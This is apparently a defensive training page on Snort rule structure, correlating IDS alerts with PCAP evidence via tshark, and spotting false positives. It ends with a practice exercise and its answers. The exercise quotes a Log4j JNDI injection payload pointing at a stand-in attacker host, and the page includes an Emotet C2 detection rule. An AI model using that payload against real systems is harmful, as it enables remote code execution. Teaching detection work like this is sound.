Snort Rule Anatomy

Understanding Snort rules is essential for interpreting IDS alerts. Every rule has two parts: the header (action, protocol, source, destination) and the options (detection logic).

Snort Rule Structure
# Rule format: action protocol src_ip src_port -> dst_ip dst_port (options)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"ET MALWARE Win32/Emotet CnC Activity (POST)";
    flow:established,to_server;
    content:"POST"; http_method;
    content:"/wp-content/uploads/"; http_uri;
    content:"Cookie:"; http_header;
    pcre:"/Cookie:\s[a-f0-9]{16,}/Hi";
    reference:url,abuse.ch;
    classtype:trojan-activity;
    sid:2028401; rev:3;
)

# Breaking it down:
alert         -- generate an alert (vs drop, pass, reject)
tcp           -- protocol
$HOME_NET     -- source: internal network
$EXTERNAL_NET -- destination: external network
msg:          -- alert message text
flow:         -- connection state (established, to_server)
content:      -- byte pattern to match
http_method:  -- match in HTTP method field specifically
pcre:         -- Perl-compatible regex for complex patterns
sid:          -- Signature ID (unique rule identifier)
rev:          -- Rule revision number

Alert Correlation with PCAP

An IDS alert tells you something triggered a rule. The PCAP tells you exactly what happened. Correlation validates the alert and provides context.

Correlation Workflow
# Step 1: Get the alert details
SID: 2028401  Time: 14:47:00  Src: 10.0.0.50  Dst: 185.234.52.18:443

# Step 2: Filter PCAP for the specific flow
$ tshark -r evidence.pcap -Y "ip.addr == 10.0.0.50 and ip.addr == 185.234.52.18" \
    -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e http.request.method

# Step 3: Examine the matching HTTP POST
$ tshark -r evidence.pcap \
    -Y "ip.src == 10.0.0.50 and ip.dst == 185.234.52.18 and http.request.method == POST" \
    -V | head -60

# Step 4: Verify the rule matched correctly
# Check: is the URI /wp-content/uploads/?
# Check: does the Cookie header match the hex pattern?
# Check: is this truly Emotet C2 or a legitimate WordPress upload?

# Step 5: Document the correlation
Alert SID 2028401 CONFIRMED as TRUE POSITIVE
Emotet C2 POST to 185.234.52.18 at 14:47:00
Cookie header contains 32-char hex string (session token)
Response: HTTP 200 with 4218 bytes (command payload)

False Positive Identification

Overly Broad Rules Rules matching common patterns (e.g., "content: GET") will fire on legitimate traffic. Check if the rule is too generic for your environment.
Legitimate Application Behavior Software updates, cloud services, and CDNs can trigger rules designed for malware. Verify the destination is actually malicious.
Context Mismatch A rule for "SQL injection" triggering on a legitimate database backup transfer. The payload matches the pattern but the context is benign.
Stale Rules Old rules for patched vulnerabilities or decommissioned IOCs. Check the rule revision date and whether the threat is still relevant.

Documenting False Positives

When you determine an alert is a false positive, document: the SID, why it is a false positive, the legitimate traffic that triggered it, and the recommended tuning action (threshold, suppress, or modify). This prevents future analysts from re-investigating the same false alarm.

Practice: Correlate Alerts with PCAP Evidence

Given these Suricata alerts, determine which are true positives and which are likely false positives:

Alert 1: SID:2024897 "ET EXPLOIT Apache Log4j RCE (CVE-2021-44228)"
  Src: 203.0.113.50:44821 -> Dst: 10.0.0.100:8080
  Payload: "${jndi:ldap://evil.com/exploit}"

Alert 2: SID:2013028 "ET POLICY curl User-Agent Outbound"
  Src: 10.0.0.25:49200 -> Dst: api.github.com:443
  User-Agent: "curl/7.88.1"

Alert 3: SID:2028401 "ET MALWARE Emotet CnC Activity (POST)"
  Src: 10.0.0.50:49301 -> Dst: 185.234.52.18:8080
  URI: /wp-content/uploads/
  Cookie: a4f8d2e1b4c596fb92427831e2f0a4c1
  1. Classify each alert as true positive, false positive, or needs investigation.
  2. For each true positive, map to MITRE ATT&CK.
  3. What PCAP analysis would you perform to validate Alert 1?

Analysis:

1. Alert 1: TRUE POSITIVE -- Log4j JNDI injection payload targeting an internal web server. Alert 2: Likely FALSE POSITIVE -- curl to GitHub API is common for DevOps automation, but investigate if 10.0.0.25 is a development server. Alert 3: TRUE POSITIVE -- matches Emotet C2 pattern with hex cookie to suspicious IP on port 8080.

2. Alert 1: T1190 (Exploit Public-Facing Application). Alert 3: T1071.001 (Web C2).

3. For Alert 1: extract the full HTTP request from PCAP, check if the JNDI payload reached the application, check for a subsequent connection from 10.0.0.100 to evil.com (indicating successful exploitation), and check for follow-on activity from 10.0.0.100.

Key Takeaways

  • Snort rules have two parts: header (who/what) and options (how to detect)
  • Suricata EVE JSON provides structured alert data ideal for SIEM and automation
  • Always correlate IDS alerts with PCAP to validate true vs false positives
  • False positive documentation prevents wasted effort and enables rule tuning
  • MITRE ATT&CK mapping standardizes alert context across the investigation team
  • SID lookup on Emerging Threats or Snort.org provides rule context and references
